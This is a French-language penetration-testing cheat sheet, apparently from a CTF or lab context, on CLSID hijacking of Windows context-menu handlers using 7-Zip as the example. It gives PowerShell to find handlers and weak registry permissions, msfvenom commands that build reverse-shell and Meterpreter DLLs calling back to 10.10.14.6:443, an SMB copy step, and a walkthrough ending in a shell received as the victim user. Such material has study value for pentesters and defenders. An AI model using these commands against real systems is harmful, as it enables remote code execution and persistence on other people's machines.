...
### <mark style="color:blue;">CLSID Hijacking (Context Menu) 📁</mark>

#### <mark style="color:green;">Description</mark>

Attaque exploitant les menus contextuels Windows (clic droit) en modifiant les clés de registre pointant vers les DLLs des extensions shell.

#### <mark style="color:green;">Architecture</mark>

```
Menu contextuel → CLSID → Clé de registre → DLL chargée
```

***

#### <mark style="color:green;">Identification</mark>

**Trouver les context handlers 7-Zip**

```powershell
Get-ChildItem "Registry::HKCR\*\shellex\ContextMenuHandlers","Registry::HKCR\Directory\shellex\ContextMenuHandlers" -ErrorAction SilentlyContinue | 
Where-Object {$_.PSChildName -match "7-?zip"} | 
Select-Object PSPath,PSChildName,@{N='CLSID';E={(Get-ItemProperty $_.PSPath).'(default)'}}
```

**Obtenir le CLSID complet**

```powershell
(Get-ItemProperty "Registry::HKCR\Directory\shellex\ContextMenuHandlers\7-Zip").'(default)'
# Output: {23170F69-40C1-278A-1000-000100020000}
```

**Trouver la DLL associée**
...
```powershell
Get-Acl "Registry::HKCR\CLSID\{CLSID}\InProcServer32" | Format-List
# Chercher "FullControl" pour des groupes non-admin
```

#### <mark style="color:green;">Exploitation</mark>

**1. Générer une DLL malveillante**

```bash
# Reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f dll -o malicious.dll

# Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=443 -f dll -o malicious.dll
```
...
# Via SMB
copy malicious.dll \\target\C$\ProgramData\
```

**3. Modifier la clé de registre**
...
**4. Attendre le trigger**

* Un utilisateur fait clic droit sur un dossier
* La DLL malveillante est chargée
* Reverse shell reçu !
...
```powershell
# Restaurer la DLL originale
Set-ItemProperty "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32" `
  -Name "(default)" `
  -Value "C:\Program Files\7-Zip\7-zip.dll"
```

#### Applications vulnérables communes
...
## <mark style="color:red;">CLSID Hijacking - Explication Ultra Simple 🎯</mark>
...
#### 1. Menu contextuel (Context Menu)
...
### Comment ça marche normalement ? ⚙️
...
### <mark style="color:blue;">Schéma final simplifié 🎨</mark>

```
TU (ee.reed - groupe Support)
    ↓
1. Crée malicious.dll (reverse shell)
    ↓
2. Upload sur C:\ProgramData\malicious.dll
    ↓
3. Modifie registre : 7-Zip → malicious.dll
    ↓
VICTIME (mm.turner)
    ↓
4. Fait clic droit → Utilise 7-Zip
    ↓
5. Windows charge malicious.dll
    ↓
6. Reverse shell se connecte à TOI
    ↓
💥 SHELL REÇU EN TANT QUE mm.turner
```

***

### <mark style="color:blue;">Résumé en 3 points 📌</mark>

1. **Tu changes l'adresse** de la DLL de 7-Zip dans le registre Windows
2. **Tu mets ta propre DLL malveillante** à la place
3. **Quand quelqu'un utilise 7-Zip**, ta DLL s'exécute et tu récupères un shell

**C'est comme** : Remplacer le livreur de pizza par ton complice. Quand quelqu'un commande une pizza, c'est ton complice qui vient et te donne les clés de la maison 🍕🔑
